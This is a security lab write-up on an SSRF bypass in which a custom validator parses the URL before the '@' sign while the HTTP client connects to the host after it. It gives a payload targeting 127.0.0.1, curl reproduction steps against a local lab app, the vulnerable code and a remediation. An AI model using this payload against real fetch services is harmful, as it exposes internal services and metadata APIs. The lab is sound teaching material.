# Lab 25 — SSRF via URL Parsing Inconsistency

## 1. Objective

Demonstrate how differential parsing of URL authority components between custom validation filters and underlying HTTP libraries enables Server-Side Request Forgery (SSRF) bypasses.

## 2. Scenario

An asset fetching proxy (`/fetch-resource`) retrieves external files and APIs on behalf of users. To prevent SSRF attacks, the developers implemented custom parsing logic intended to handle basic authentication credentials embedded in URLs. However, the custom parser erroneously extracts the hostname component *before* the `@` symbol, whereas standard RFC-compliant HTTP client libraries interpret text before the `@` symbol as user credentials (`userinfo`) and resolve the host *after* the `@` symbol.

**Trust boundary:** The application assumed that custom string-splitting logic would interpret URL structures identically to the underlying HTTP client library.

## 3. Preconditions

| Item | Value |
|------|-------|
| Target endpoint | `/lab/ssrf/ssrf-05/fetch-resource` |
| Ambiguous URL format | `http://public.example.com@127.0.0.1:5001/internal/health` |
| Authenticated user | `alice` / `alice123` |
| Seed state | Initial database seed (`POST /reset`) |

## 4. Vulnerability Mechanism

The application's validation function splits the network location (`netloc`) on `@` and takes the preceding component:

```python
netloc = parsed.netloc
if '@' in netloc:
    host_part = netloc.split('@')[0]
else:
    host_part = netloc
hostname = host_part.split(':')[0]
```

When evaluated against `http://public.example.com@127.0.0.1:5001/internal/health`, the validator inspects `public.example.com`, notes that it is not in `BLOCKED_HOSTNAMES` and not a private IP, and allows the request.

Next, the standard HTTP client (`requests.get`) parses the URL according to RFC 3986:

```python
resp = http_requests.get(url, timeout=5)
```

The HTTP library treats `public.example.com` as the username component and initiates a connection to `127.0.0.1:5001`, bypassing the security check entirely.

## 5. Reproduction

1. Authenticate as `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Submit a resource fetch request containing an ambiguous authority payload:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/ssrf/ssrf-05/fetch-resource \
  -H "Content-Type: application/json" \
  -d '{"url": "http://public.example.com@127.0.0.1:5001/internal/health"}'
```

3. Observe the response content.

## 6. Evidence

The application returns HTTP 200 with data from the loopback service:

```json
{
  "body": "{\"service\": \"internal-api\", \"status\": \"healthy\"}",
  "status_code": 200
}
```

The custom validator approved `public.example.com`, but the HTTP client connected to `127.0.0.1:5001`.

## 7. Root Cause

**File:** `app/routes/ssrf.py`  
**Functions:** `_naive_at_sign_check()` and `lab25_fetch_resource()`

The custom parser splits the authority string inconsistently with standard URL parsers:

```python
if patched:
    safe, reason = _is_url_safe(url)
    if not safe:
        return jsonify({'error': f'URL blocked: {reason}'}), 403
else:
    safe, reason = _naive_at_sign_check(url)
    if not safe:
        return jsonify({'error': f'URL blocked: {reason}'}), 403
```

## 8. Impact

Attackers can bypass hostname allowlists and IP blocklists to access restricted internal services, metadata APIs, and internal administrative tooling.

## 9. Remediation

Avoid custom regex or string-splitting URL parsers. Rely on standard library parsers (`urllib.parse.urlparse`), extract canonical `parsed.hostname`, resolve destination IPs via `socket.getaddrinfo`, and validate both scheme and IP address ranges:

```python
parsed = urlparse(url)
hostname = parsed.hostname
results = socket.getaddrinfo(hostname, parsed.port or 80, proto=socket.IPPROTO_TCP)
for family, type_, proto, canonname, sockaddr in results:
    ip = sockaddr[0]
    if _is_private_ip(ip):
        return False, 'Hostname resolves to private IP'
```

## 10. Regression Validation

**Test:** `tests/test_lab_25.py`

- **Vulnerable mode:** URL with ambiguous `@` authority passes naive validator and fetches target.
- **Patched mode:** URL with ambiguous authority has destination resolved correctly; loopback destination returns HTTP 403 (`URL blocked`).
- **Legitimate flow:** Empty URL is rejected with HTTP 400.

## 11. Research Discussion

1. Why are parser differentials (in URL parsing, HTTP request smuggling, or JSON decoding) high-yield vulnerability classes?
2. How do discrepancies between WHATWG URL standards and IETF RFC 3986 impact web application security?
3. What is the benefit of using an isolated egress forward proxy (such as Envoy or Squid) to enforce SSRF policies at the network boundary?
